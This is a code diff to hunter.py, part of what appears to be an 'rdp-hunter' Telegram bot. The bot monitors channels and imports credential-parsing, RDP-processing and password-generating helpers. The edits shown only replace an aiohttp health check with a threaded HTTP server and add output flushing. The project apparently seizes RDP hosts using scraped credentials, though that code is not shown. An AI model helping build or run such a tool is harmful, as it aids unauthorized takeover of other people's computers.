@@ -1,9 +1,9 @@
-print("[STARTUP] hunter.py loading...")
+import sys
+print("[STARTUP] hunter.py loading...", flush=True)
 import os
 import asyncio
 import json
 from datetime import datetime
-from aiohttp import web
 from telethon import TelegramClient, events
 from telethon.tl.types import PeerChannel
 from telethon.sessions import StringSession
@@ -13,7 +13,7 @@ from config import (
 )
 from changer import parse_credentials, process_rdp, generate_password
 
-print("[STARTUP] Imports done, starting main...")
+print("[STARTUP] Imports done, starting main...", flush=True)
 
 
 async def send_to_saved(client, text):
@@ -23,8 +23,28 @@ async def send_to_saved(client, text):
         pass
 
 
-async def health_check(request):
-    return web.Response(text="OK")
+def run_health_server(port):
+    """Simple health check server in background thread"""
+    from http.server import HTTPServer, BaseHTTPRequestHandler
+    import threading
+    
+    class HealthHandler(BaseHTTPRequestHandler):
+        def do_GET(self):
+            if self.path == '/health':
+                self.send_response(200)
+                self.send_header('Content-type', 'text/plain')
+                self.end_headers()
+                self.wfile.write(b'OK')
+            else:
+                self.send_response(404)
+                self.end_headers()
+        def log_message(self, format, *args):
+            pass
+    
+    server = HTTPServer(('0.0.0.0', port), HealthHandler)
+    thread = threading.Thread(target=server.serve_forever, daemon=True)
+    thread.start()
+    return server
 
 
 def format_result(record):
@@ -87,37 +107,33 @@ async def main():
         if record:
             await send_to_saved(client, format_result(record))
     
-    print("[*] rdp-hunter starting...")
-    print(f"[*] Monitoring {len(channels)} channel(s): {', '.join(channels)}")
+    print("[*] rdp-hunter starting...", flush=True)
+    print(f"[*] Monitoring {len(channels)} channel(s): {', '.join(channels)}", flush=True)
     
-    # Start health check server for Railway
-    app = web.Application()
-    app.router.add_get('/health', health_check)
-    runner = web.AppRunner(app)
-    await runner.setup()
-    site = web.TCPSite(runner, '0.0.0.0', int(os.getenv('PORT', '8080')))
-    await site.start()
-    print("[*] Health check server on port", os.getenv('PORT', '8080'))
+    # Start simple health check server for Railway
+    port = int(os.getenv('PORT', '8080'))
+    health_server = run_health_server(port)
+    print(f"[*] Health check server on port {port}", flush=True)
     
     try:
         if BOT_TOKEN:
-            print("[*] Starting bot...")
+            print("[*] Starting bot...", flush=True)
             await client.start(bot_token=BOT_TOKEN)
-            print("[*] Bot connected successfully")
+            print("[*] Bot connected successfully", flush=True)
         elif STRING_SESSION:
             await client.connect()
             if not await client.is_user_authorized():
-                print("❌ StringSession invalid/expired")
+                print("❌ StringSession invalid/expired", flush=True)
                 return
         elif PHONE_NUMBER:
             await client.start(phone=PHONE_NUMBER)
         else:
             await client.start()
         
-        print("[*] Connected. Running 24/7...")
+        print("[*] Connected. Running 24/7...", flush=True)
         await client.run_until_disconnected()
     except Exception as e:
-        print(f"❌ STARTUP ERROR: {e}")
+        print(f"❌ STARTUP ERROR: {e}", flush=True)
         import traceback
         traceback.print_exc()
         # Keep health check alive so Railway doesn't restart loop
